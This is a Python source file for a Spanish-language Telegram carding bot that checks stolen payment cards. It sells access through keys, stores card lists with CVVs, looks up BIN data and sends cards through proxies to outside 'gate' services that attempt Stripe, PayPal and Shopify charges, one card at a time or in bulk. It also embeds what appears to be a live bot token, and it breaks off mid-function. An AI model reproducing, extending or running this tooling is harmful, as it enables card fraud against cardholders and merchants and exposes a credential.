import telebot
from telebot import types
import requests
import sqlite3
import json
import time
import os
import re
import random
import socket
import string
from datetime import datetime, timedelta
from threading import Thread, Lock

# Configuración del bot
TOKEN = os.environ.get('TOKEN', '8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE')
OWNER_ID = 8220432777  # Tu ID de Telegram
bot = telebot.TeleBot(TOKEN)

# Lock para operaciones de base de datos
db_lock = Lock()

# ==================== FUNCIONES DE BASE DE DATOS ====================

def get_db_connection():
    """Crea una nueva conexión a la base de datos"""
    conn = sqlite3.connect('bot.db', timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    """Inicializa la base de datos con todas las tablas necesarias"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Tabla de proxies
    cursor.execute('''CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT,
        last_test TEXT,
        status TEXT DEFAULT 'untested'
    )''')
    
    # Tabla de historial
    cursor.execute('''CREATE TABLE IF NOT EXISTS historial (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT,
        proxy TEXT,
        gate TEXT,
        amount TEXT,
        status TEXT,
        message TEXT,
        gates TEXT,
        bin_info TEXT,
        fecha TEXT
    )''')
    
    # Tabla de tarjetas
    cursor.execute('''CREATE TABLE IF NOT EXISTS tarjetas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT UNIQUE,
        fecha TEXT,
        veces_verificada INTEGER DEFAULT 0
    )''')
    
    # Tabla de sitios Shopify
    cursor.execute('''CREATE TABLE IF NOT EXISTS sitios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT
    )''')
    
    # Tabla para KEYS de acceso
    cursor.execute('''CREATE TABLE IF NOT EXISTS access_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key TEXT UNIQUE,
        created_by INTEGER,
        created_date TEXT,
        expires_date TEXT,
        max_uses INTEGER DEFAULT 1,
        uses_count INTEGER DEFAULT 0,
        is_active BOOLEAN DEFAULT 1,
        last_used TEXT,
        notes TEXT
    )''')
    
    # Tabla de usuarios autorizados
    cursor.execute('''CREATE TABLE IF NOT EXISTS authorized_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER UNIQUE,
        username TEXT,
        key_used TEXT,
        first_seen TEXT,
        last_seen TEXT,
        uses_count INTEGER DEFAULT 0
    )''')
    
    # Agregar columnas si no existen
    try:
        cursor.execute("ALTER TABLE proxies ADD COLUMN last_test TEXT")
        cursor.execute("ALTER TABLE proxies ADD COLUMN status TEXT DEFAULT 'untested'")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN gate TEXT")
        cursor.execute("ALTER TABLE historial ADD COLUMN amount TEXT")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN bin_info TEXT")
    except:
        pass
    
    conn.commit()
    conn.close()
    print("✅ Base de datos configurada correctamente")

# Inicializar BD
init_database()

# ==================== SISTEMA DE KEYS ====================

def generar_key(longitud=16):
    """Genera una key aleatoria"""
    caracteres = string.ascii_uppercase + string.digits
    key = ''.join(random.choices(caracteres, k=longitud))
    # Agregar guiones cada 4 caracteres para mejor legibilidad
    key_formateada = '-'.join([key[i:i+4] for i in range(0, len(key), 4)])
    return key_formateada

def crear_key(duracion_dias=30, max_uses=1, notas=""):
    """Crea una nueva key en la base de datos"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    key = generar_key()
    created_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    expires_date = (datetime.now() + timedelta(days=duracion_dias)).strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        cursor.execute(
            "INSERT INTO access_keys (key, created_by, created_date, expires_date, max_uses, notes) VALUES (?, ?, ?, ?, ?, ?)",
            (key, OWNER_ID, created_date, expires_date, max_uses, notas)
        )
        conn.commit()
        return key
    except Exception as e:
        print(f"Error creando key: {e}")
        return None
    finally:
        conn.close()

def validar_key(key):
    """Valida si una key es válida y devuelve información"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute(
        "SELECT * FROM access_keys WHERE key = ? AND is_active = 1",
        (key,)
    )
    key_info = cursor.fetchone()
    conn.close()
    
    if not key_info:
        return False, "❌ Key no válida"
    
    # Verificar expiración
    expires = datetime.strptime(key_info['expires_date'], "%Y-%m-%d %H:%M:%S")
    if expires < datetime.now():
        return False, "❌ Key expirada"
    
    # Verificar usos máximos
    if key_info['uses_count'] >= key_info['max_uses']:
        return False, "❌ Key alcanzó su límite de usos"
    
    return True, key_info

def registrar_uso_key(key, user_id, username):
    """Registra el uso de una key y al usuario"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Actualizar contador de la key
    cursor.execute(
        "UPDATE access_keys SET uses_count = uses_count + 1, last_used = ? WHERE key = ?",
        (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), key)
    )
    
    # Registrar o actualizar usuario
    cursor.execute(
        """INSERT OR REPLACE INTO authorized_users 
        (user_id, username, key_used, first_seen, last_seen, uses_count) 
        VALUES (?, ?, ?, 
                COALESCE((SELECT first_seen FROM authorized_users WHERE user_id = ?), ?), 
                ?, 
                COALESCE((SELECT uses_count FROM authorized_users WHERE user_id = ?), 0) + 1)""",
        (user_id, username, key, user_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 
         datetime.now().strftime("%Y-%m-%d %H:%M:%S"), user_id)
    )
    
    conn.commit()
    conn.close()

def listar_keys():
    """Lista todas las keys (solo owner)"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM access_keys ORDER BY created_date DESC")
    keys = cursor.fetchall()
    conn.close()
    return keys

def desactivar_key(key):
    """Desactiva una key"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE access_keys SET is_active = 0 WHERE key = ?", (key,))
    conn.commit()
    rows = cursor.rowcount
    conn.close()
    return rows > 0

def verificar_acceso(message):
    """Verifica si el usuario tiene acceso al bot"""
    user_id = message.from_user.id
    
    # Owner siempre tiene acceso
    if user_id == OWNER_ID:
        return True, None
    
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM authorized_users WHERE user_id = ?", (user_id,))
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return True, None
    else:
        return False, "❌ No tienes acceso. Necesitas una key válida. Usa /key [KEY]"

# ==================== DECORADOR PARA VERIFICAR ACCESO ====================

def requiere_acceso(func):
    """Decorador para verificar acceso antes de ejecutar comandos"""
    def wrapper(message, *args, **kwargs):
        tiene_acceso, mensaje = verificar_acceso(message)
        if tiene_acceso:
            return func(message, *args, **kwargs)
        else:
            bot.reply_to(message, mensaje)
            return None
    return wrapper

# ==================== COMANDOS DE KEYS (SOLO OWNER) ====================

@bot.message_handler(commands=['genkey'])
def cmd_genkey(message):
    """Genera una nueva key (solo owner)"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Solo el owner puede generar keys")
        return
    
    try:
        # Parsear argumentos: /genkey [dias] [usos] [notas]
        partes = message.text.split()
        dias = 30
        usos = 1
        notas = ""
        
        if len(partes) >= 2:
            dias = int(partes[1])
        if len(partes) >= 3:
            usos = int(partes[2])
        if len(partes) >= 4:
            notas = ' '.join(partes[3:])
        
        key = crear_key(dias, usos, notas)
        
        if key:
            texto = f"""✅ *KEY GENERADA*

🔑 `{key}`

📅 Expira: {dias} días
🔄 Usos máximos: {usos}
📝 Notas: {notas if notas else 'Sin notas'}

💡 El usuario debe usar: /key {key}"""
            
            bot.reply_to(message, texto, parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Error al generar la key")
            
    except ValueError:
        bot.reply_to(message, "❌ Uso: /genkey [días] [usos máximos] [notas]")

@bot.message_handler(commands=['listkeys'])
def cmd_listkeys(message):
    """Lista todas las keys (solo owner)"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Solo el owner puede ver las keys")
        return
    
    keys = listar_keys()
    
    if not keys:
        bot.reply_to(message, "📭 No hay keys generadas")
        return
    
    texto = "🔑 *KEYS GENERADAS*\n\n"
    
    for k in keys:
        # Emoji según estado
        estado = "✅ ACTIVA" if k['is_active'] else "❌ INACTIVA"
        expira = datetime.strptime(k['expires_date'], "%Y-%m-%d %H:%M:%S")
        ahora = datetime.now()
        if expira < ahora:
            estado = "⌛ EXPIRADA"
        
        texto += f"🔹 `{k['key']}`\n"
        texto += f"   ├ Estado: {estado}\n"
        texto += f"   ├ Creada: {k['created_date'][:10]}\n"
        texto += f"   ├ Expira: {k['expires_date'][:10]}\n"
        texto += f"   ├ Usos: {k['uses_count']}/{k['max_uses']}\n"
        texto += f"   └ Notas: {k['notes'] if k['notes'] else 'Sin notas'}\n\n"
    
    bot.reply_to(message, texto, parse_mode='Markdown')

@bot.message_handler(commands=['delkey'])
def cmd_delkey(message):
    """Desactiva una key (solo owner)"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Solo el owner puede desactivar keys")
        return
    
    try:
        key = message.text.split()[1]
        if desactivar_key(key):
            bot.reply_to(message, f"✅ Key desactivada: `{key}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ Key no encontrada")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /delkey KEY")

@bot.message_handler(commands=['users'])
def cmd_users(message):
    """Lista usuarios autorizados (solo owner)"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Solo el owner puede ver los usuarios")
        return
    
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM authorized_users ORDER BY last_seen DESC")
    users = cursor.fetchall()
    conn.close()
    
    if not users:
        bot.reply_to(message, "📭 No hay usuarios registrados")
        return
    
    texto = "👥 *USUARIOS AUTORIZADOS*\n\n"
    
    for u in users:
        texto += f"🔹 ID: `{u['user_id']}`\n"
        texto += f"   ├ Usuario: @{u['username'] if u['username'] else 'N/A'}\n"
        texto += f"   ├ Key: `{u['key_used']}`\n"
        texto += f"   ├ Primer uso: {u['first_seen'][:16]}\n"
        texto += f"   ├ Último uso: {u['last_seen'][:16]}\n"
        texto += f"   └ Usos: {u['uses_count']}\n\n"
    
    bot.reply_to(message, texto, parse_mode='Markdown')

# ==================== COMANDO PARA ACTIVAR KEY ====================

@bot.message_handler(commands=['key'])
def cmd_activate_key(message):
    """Activa una key para el usuario"""
    try:
        key = message.text.split()[1]
        user_id = message.from_user.id
        username = message.from_user.username or "unknown"
        
        # Validar key
        es_valida, info = validar_key(key)
        
        if es_valida:
            # Registrar uso
            registrar_uso_key(key, user_id, username)
            
            texto = f"""✅ *KEY ACTIVADA CORRECTAMENTE*

🎉 ¡Ya tienes acceso al bot!

📋 *Comandos disponibles:*
• /menu - Ver menú principal
• /help - Ayuda detallada
• /check CC - Stripe $1
• /pp CC - PayPal $10
• /pp2 CC - PayPal $0.10
• /pp3 CC - PayPal $1
• /sh CC - AutoShopify
• /mass - Stripe masivo
• /mpp - PayPal masivo
• /msh - Shopify masivo

✨ *Disfruta del bot!*"""
            
            bot.reply_to(message, texto, parse_mode='Markdown')
        else:
            bot.reply_to(message, info)
            
    except IndexError:
        bot.reply_to(message, "❌ Uso: /key TU_KEY_AQUI")

# ==================== FUNCIONES DE PROXIES ====================

def guardar_proxy(proxy):
    """Guarda un proxy en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)", 
                      (proxy, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando proxy: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_proxies_desde_texto(texto):
    """Guarda proxies desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    patron_proxy = re.compile(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)(?::([^:]+):([^:]+))?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        if patron_proxy.match(linea):
            try:
                cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_proxies():
    """Obtiene todos los proxies"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy FROM proxies")
    proxies = [row[0] for row in cursor.fetchall()]
    conn.close()
    return proxies

def obtener_proxies_con_estadisticas():
    """Obtiene proxies con sus estadísticas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy, successes, failures, last_test, status FROM proxies ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_proxy(proxy):
    """Elimina un proxy específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE proxy = ?", (proxy,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_proxies():
    """Elimina TODOS los proxies"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_proxy(proxy, success):
    """Actualiza estadísticas de un proxy"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE proxies SET {campo} = {campo} + 1, last_used = ? WHERE proxy = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

def actualizar_status_proxy(proxy, status, detalle):
    """Actualiza el status del proxy después del test"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE proxies SET status = ?, last_test = ? WHERE proxy = ?",
                  (status, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

# ==================== NUEVA FUNCIÓN DE CONSULTA BIN (MEJORADA) ====================

def consultar_bin(bin_number):
    """
    Consulta información de BIN usando bincheck.io (más preciso)
    """
    try:
        bin_number = bin_number[:6]
        
        # API de bincheck.io
        url = f"https://lookup.bincheck.io/api/v2/{bin_number}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        response = requests.get(url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            
            # Mapear la respuesta al formato que usa el bot
            return {
                'scheme': data.get('scheme', 'UNKNOWN').upper(),
                'type': data.get('type', 'UNKNOWN').upper(),
                'country': {
                    'name': data.get('country', {}).get('name', 'Unknown'),
                    'emoji': data.get('country', {}).get('emoji', '🌍'),
                    'code': data.get('country', {}).get('code', '')
                },
                'bank': {
                    'name': data.get('bank', {}).get('name', 'Unknown'),
                    'url': data.get('bank', {}).get('url', ''),
                    'phone': data.get('bank', {}).get('phone', '')
                }
            }
        elif response.status_code == 404:
            return {"error": "BIN no encontrado", "bin": bin_number}
        elif response.status_code == 429:
            return {"error": "Límite de peticiones excedido", "bin": bin_number}
        else:
            return {"error": f"Error {response.status_code}", "bin": bin_number}
            
    except Exception as e:
        return {"error": str(e), "bin": bin_number}

# ==================== FUNCIONES DE TARJETAS ====================

def guardar_tarjetas_desde_texto(texto):
    """Guarda tarjetas desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardadas = 0
    repetidas = 0
    invalidas = 0
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        partes = linea.split('|')
        if len(partes) == 4:
            try:
                cursor.execute("INSERT INTO tarjetas (cc, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardadas += 1
            except:
                repetidas += 1
        else:
            invalidas += 1
    
    conn.close()
    return guardadas, repetidas, invalidas

def obtener_todas_tarjetas():
    """Obtiene todas las tarjetas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT cc, fecha, veces_verificada FROM tarjetas ORDER BY fecha DESC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def aumentar_contador_tarjeta(cc):
    """Aumenta el contador de verificaciones de una tarjeta"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE tarjetas SET veces_verificada = veces_verificada + 1 WHERE cc = ?",
                  (cc,))
    conn.commit()
    conn.close()

def eliminar_tarjeta(cc):
    """Elimina una tarjeta específica"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas WHERE cc = ?", (cc,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def guardar_historial(cc, proxy, gate, amount, status, message, gates, bin_info):
    """Guarda una verificación en el historial"""
    if isinstance(bin_info, dict):
        bin_info_str = json.dumps(bin_info)
    else:
        bin_info_str = bin_info
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("INSERT INTO historial (cc, proxy, gate, amount, status, message, gates, bin_info, fecha) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                  (cc, proxy, gate, amount, status, message, gates, bin_info_str, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()
    
    if proxy != 'gestionado':
        actualizar_estadisticas_proxy(proxy, status == 'success')
    
    aumentar_contador_tarjeta(cc)

# ==================== FUNCIONES DE SITIOS SHOPIFY ====================

def guardar_sitio(url):
    """Guarda un sitio Shopify en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)", 
                      (url, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando sitio: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_sitios_desde_texto(texto):
    """Guarda sitios desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    patron_url = re.compile(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        if patron_url.match(linea):
            try:
                cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_sitios():
    """Obtiene todos los sitios Shopify"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM sitios")
    sitios = [row[0] for row in cursor.fetchall()]
    conn.close()
    return sitios

def eliminar_sitio(url):
    """Elimina un sitio específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios WHERE url = ?", (url,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def actualizar_estadisticas_sitio(url, success):
    """Actualiza estadísticas de un sitio"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE sitios SET {campo} = {campo} + 1, last_used = ? WHERE url = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
    conn.commit()
    conn.close()

# ==================== FUNCIÓN DE VERIFICACIÓN STRIPE ====================

def verificar_api_stripe(cc, proxy=None):
    """
    Verifica usando Stripe (endpoint /api/check3) - $1.00
    """
    try:
        api_url = f"https://samurai-api-hub.up.railway.app/api/check3?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates = data.get('gates', 'stripe 1.00$ charged')
            amount = data.get('amount', '1.00')
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates,
                'gate_name': 'Stripe $1.00',
                'amount': amount,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'stripe error',
                'gate_name': 'Stripe $1.00',
                'amount': '1.00',
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'stripe error',
            'gate_name': 'Stripe $1.00',
            'amount': '1.00',
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIONES DE VERIFICACIÓN PAYPAL ====================

def verificar_api_paypal(cc, gate=1, proxy=None):
    """
    Verifica usando PayPal con diferentes montos
    gate 1: /pp/check  - $10.00
    gate 2: /pp/check2 - $0.10
    gate 3: /pp/check3 - $1.00
    """
    gates = {
        1: {"endpoint": "/pp/check", "amount": "10.00", "name": "PayPal $10"},
        2: {"endpoint": "/pp/check2", "amount": "0.10", "name": "PayPal $0.10"},
        3: {"endpoint": "/pp/check3", "amount": "1.00", "name": "PayPal $1"}
    }
    
    gate_info = gates.get(gate, gates[1])
    
    try:
        api_url = f"https://samurai-api-hub.up.railway.app{gate_info['endpoint']}?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates_str = f"paypal {gate_info['amount']}$ charged"
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates_str,
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'paypal error',
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'paypal error',
            'gate_name': gate_info['name'],
            'amount': gate_info['amount'],
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY ====================

def verificar_api_autoshopify(cc, url, proxy=None):
    """
    Verifica usando AutoShopify (endpoint shopi.php)
    """
    try:
        api_url = f"http://dev-kamal.pw/shopi.php?cc={cc}&url={url}"
        if proxy:
            api_url += f"&proxy={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            response_text = data.get('Response', 'Unknown')
            price = data.get('Price', '0.00')
            gate = data.get('Gate', 'Shopify')
            
            # Determinar si es éxito
            is_success = 'Order completed' in response_text
            
            return {
                'success': is_success,
                'status': 'success' if is_success else 'failed',
                'message': response_text,
                'gates': f"Shopify ${price}",
                'gate_name': f"AutoShopify ${price}",
                'amount': price,
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code} - {response.text[:100]}',
                'gates': 'shopify error',
                'gate_name': 'AutoShopify',
                'amount': '0.00',
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'shopify error',
            'gate_name': 'AutoShopify',
            'amount': '0.00',
            'url': url,
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FORMATO PREMIUM PARA RESULTADOS ====================

def formato_check_premium(cc, resultado_api, bin_info, tiempo, user_name="User", gate_type="Stripe"):
    """
    Formato premium con diseño tipo checker profesional
    """
    # Determinar estado de la verificación
    if resultado_api['status'] == 'success':
        estado_verif = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
        color_estado = "✅"
    elif resultado_api['status'] == 'failed':
        estado_verif = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        color_estado = "❌"
    elif resultado_api['status'] == 'error':
        estado_verif = "𝐄𝐫𝐫𝐨𝐫 ⚠️"
        color_estado = "⚠️"
    else:
        estado_verif = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧 ❓"
        color_estado = "❓"
    
    # Extraer datos de la tarjeta
    partes = cc.split('|')
    numero = partes[0]
    mes = partes[1]
    año = partes[2]
    cvv = partes[3]
    bin_num = numero[:6]
    
    # Extraer información del BIN
    if bin_info and isinstance(bin_info, dict) and 'error' not in bin_info:
        scheme = bin_info.get('scheme', 'UNKNOWN').upper()
        card_type = bin_info.get('type', 'UNKNOWN').upper()
        
        # Datos del país
        country_info = bin_info.get('country', {})
        country_name = country_info.get('name', 'Unknown')
        country_emoji = country_info.get('emoji', '🌍')
        
        # Datos del banco
        bank_info = bin_info.get('bank', {})
        bank_name = bank_info.get('name', 'Unknown')
        
        # Determinar tipo de tarjeta completo
        if scheme == "VISA":
            tipo_completo = "VISA"
        elif scheme == "MASTERCARD":
            tipo_completo = "MASTERCARD"
        elif scheme == "AMEX":
            tipo_completo = "AMERICAN EXPRESS"
        elif scheme == "DISCOVER":
            tipo_completo = "DISCOVER"
        elif scheme == "JCB":
            tipo_completo = "JCB"
        else:
            tipo_completo = scheme
        
        # Tipo específico (debit/credit)
        tipo_especifico = card_type.capitalize() if card_type else "UNKNOWN"
        
        # Información de país formateada
        country_line = f"{country_name} {country_emoji}"
    else:
        tipo_completo = "UNKNOWN"
        tipo_especifico = "UNKNOWN"
        country_line = "Unknown 🌍"
        bank_name = "Unknown"
    
    # Status del proxy
    if resultado_api['proxy'] == 'gestionado':
        proxy_status = "API 🌐"
    else:
        proxy_status = "Live ✨"
    
    # Formatear tiempo
    if tiempo < 60:
        tiempo_str = f"{tiempo:.2f}s"
    else:
        minutos = int(tiempo // 60)
        segundos = int(tiempo % 60)
        tiempo_str = f"{minutos}m {segundos}s"
    
    # Limpiar mensaje de estado
    status_msg = resultado_api['message']
    
    # Construir el mensaje premium
    texto = f"""
{color_estado} {estado_verif}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 : {numero}|{mes}|{año}|{cvv}
[ϟ] 𝗚𝗮𝘁𝗲 : {resultado_api['gate_name']}
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status_msg[:40]}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : {bin_num}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country_line}
[ϟ] 𝗕𝗮𝗻𝗸 : {bank_name[:30]}
[ϟ] 𝗧𝘆𝗽𝗲 : {tipo_completo} | {tipo_especifico}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] T/t : {tiempo_str} | Proxy : {proxy_status}
[ϟ] 𝗖𝗵𝗲𝗸𝗲𝗱 𝗯𝘆 : @AutoShopifyBot
[ϟ] 𝗢𝘄𝗻𝗲𝗿 : {user_name}
╚━━━━「𝐀𝐔𝐓𝐎 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐁𝐎𝐓」━━━━╝
"""
    return texto

# ==================== TEST DE PROXIES MEJORADO ====================

def test_proxy_socket(proxy, timeout=3):
    """Test básico de conectividad usando socket"""
    try:
        partes = proxy.split(':')
        if len(partes) == 4:
            ip, puerto, user, passw = partes
        elif len(partes) == 2:
            ip, puerto = partes
        else:
            return False, "Formato inválido"
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, int(puerto)))
        sock.close()
        
        if result == 0:
            return True, "Socket OK"
        else:
            return False, f"Socket error {result}"
            
    except Exception as e:
        return False, str(e)

def test_proxy_http(proxy, timeout=5):
    """Test HTTP con endpoint confiable"""
    test_urls = [
        "https://httpbin.org/ip",
        "http://ip-api.com/json",
        "https://api.ipify.org?format=json"
    ]
    
    try:
        partes = proxy.split(':')
        if len(partes) == 4:
            ip, puerto, user, passw = partes
            proxy_dict = {
                'http': f'http://{user}:{passw}@{ip}:{puerto}',
                'https': f'https://{user}:{passw}@{ip}:{puerto}'
            }
        elif len(partes) == 2:
            ip, puerto = partes
            proxy_dict = {
                'http': f'http://{ip}:{puerto}',
                'https': f'https://{ip}:{puerto}'
            }
        else:
            return False, "Formato inválido", 0
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        for url in test_urls:
            try:
                start_time = time.time()
                response = requests.get(url, proxies=proxy_dict, headers=headers, timeout=timeout)
                elapsed = time.time() - start_time
                
                if response.status_code == 200:
                    return True, "HTTP OK", elapsed
            except:
                continue
        
        return False, "HTTP Fail", 0
        
    except Exception as e:
        return False, str(e), 0

@bot.message_handler(commands=['testproxy'])
@requiere_acceso
def cmd_test_proxies_avanzado(message):
